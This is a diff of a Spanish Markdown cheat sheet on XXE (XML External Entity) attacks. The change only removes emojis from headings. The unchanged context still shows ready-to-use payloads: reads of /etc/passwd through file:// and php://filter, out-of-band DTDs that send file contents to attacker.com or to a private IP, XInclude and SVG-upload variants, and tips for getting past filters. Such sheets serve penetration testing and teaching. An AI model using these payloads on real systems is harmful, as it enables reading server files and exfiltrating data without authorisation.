@@ -4,16 +4,16 @@
 
 ---
 
-#### 📝 **¿Qué es XXE?**  
+#### **¿Qué es XXE?**  
 El ataque **XXE (XML External Entity)** aprovecha vulnerabilidades en el procesamiento de entidades XML en aplicaciones web.  
 Permite al atacante:  
-- 🗃️ **Leer archivos locales.**  
-- 🌐 **Realizar solicitudes HTTP desde el servidor.**  
-- 🛠️ **Realizar ataques SSRF, DoS o RCE.**  
+- **Leer archivos locales.**  
+- **Realizar solicitudes HTTP desde el servidor.**  
+- **Realizar ataques SSRF, DoS o RCE.**  
 
 ---
 
-## ⚙️ **Tipos de Entidades en XML**
+## **Tipos de Entidades en XML**
 
 | Tipo                   | Descripción                                                                     |
 | ---------------------- | ------------------------------------------------------------------------------- |
@@ -25,7 +25,7 @@ Permite al atacante:
 
 ---
 
-## 📝 **Ejemplo de Estructura XML**
+## **Ejemplo de Estructura XML**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?> <!-- Declaración XML -->
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "mi entidad">]> <!-- DTD (Document Type Definition) -->
@@ -40,9 +40,9 @@ Permite al atacante:
 
 ---
 
-## 💣 **Normal XXE (Local File Disclosure)**
+## **Normal XXE (Local File Disclosure)**
 
-### 📂 **Payloads:**
+### **Payloads:**
 ```xml
 <!DOCTYPE foo [ <!ENTITY myFile SYSTEM "file:///etc/passwd"> ]>
 <!DOCTYPE foo [ <!ENTITY myFile SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
@@ -50,10 +50,10 @@ Permite al atacante:
 
 ---
 
-## 🌐 **Out Of Band XXE (OOB)**
+## **Out Of Band XXE (OOB)**
 - Estas inyecciones son ciegas (blind), donde el servidor realiza solicitudes HTTP hacia un servidor externo.
 
-### 📝 **Payloads:**
+### **Payloads:**
 ```xml
 <!DOCTYPE foo [ <!ENTITY myFile SYSTEM "http://192.168.64.128/testXXE"> ]>
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://192.168.64.128/malicious.dtd"> %xxe; ]>
@@ -61,9 +61,9 @@ Permite al atacante:
 
 ---
 
-## 💾 **Malicious DTD Files**
+## **Malicious DTD Files**
 
-### 📝 **Malicious DTD 1 - Base64 Encoding:**
+### **Malicious DTD 1 - Base64 Encoding:**
 ```xml
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?file=%file;'>">
@@ -71,14 +71,14 @@ Permite al atacante:
 %exfil;
 ```
 
-### 📝 **Malicious DTD 2 - Direct File Read:**
+### **Malicious DTD 2 - Direct File Read:**
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % stack "<!ENTITY exfil SYSTEM 'http://attacker.com/?file=%file;'>">
 %stack;
 ```
 
-### 📝 **Malicious DTD 3 - Error-Based XXE:**
+### **Malicious DTD 3 - Error-Based XXE:**
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % stack "<!ENTITY &#x25; error SYSTEM 'file://idontexist/%file;'>">
@@ -86,9 +86,9 @@ Permite al atacante:
 
 ---
 
-## 🛑 **XInclude Injection**
+## **XInclude Injection**
 
-### 📂 **Payloads:**
+### **Payloads:**
 **XInclude Local File:**
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
@@ -105,9 +105,9 @@ Permite al atacante:
 
 ---
 
-## 🖼️ **XXE via Image File Upload**
+## **XXE via Image File Upload**
 
-### 📝 **Normal XXE:**
+### **Normal XXE:**
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE svg [
@@ -118,7 +118,7 @@ Permite al atacante:
 </svg>
 ```
 
-### 📝 **OOB XXE:**
+### **OOB XXE:**
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE svg [
@@ -132,9 +132,9 @@ Permite al atacante:
 
 ---
 
-## 🔍 **XXE by Repurposing Local DTD**
+## **XXE by Repurposing Local DTD**
 
-### 📝 **Payload:**
+### **Payload:**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY % myFile SYSTEM "file:///usr/share/xml/catalog"> %myFile; ]>
@@ -142,9 +142,9 @@ Permite al atacante:
 
 ---
 
-## 📝 **Consejos Útiles:**
-- 📌 **Siempre invoca el nombre de la entidad dentro del XML para ejecutar el payload.**  
-- 🚀 **Si el ataque falla, intenta eliminar el `%` o probar variantes de codificación.**  
-- 🛑 **Si el servidor bloquea ciertas entidades, intenta ofuscar los caracteres.**  
+## **Consejos Útiles:**
+- **Siempre invoca el nombre de la entidad dentro del XML para ejecutar el payload.**  
+- **Si el ataque falla, intenta eliminar el `%` o probar variantes de codificación.**  
+- **Si el servidor bloquea ciertas entidades, intenta ofuscar los caracteres.**  
 
 ---
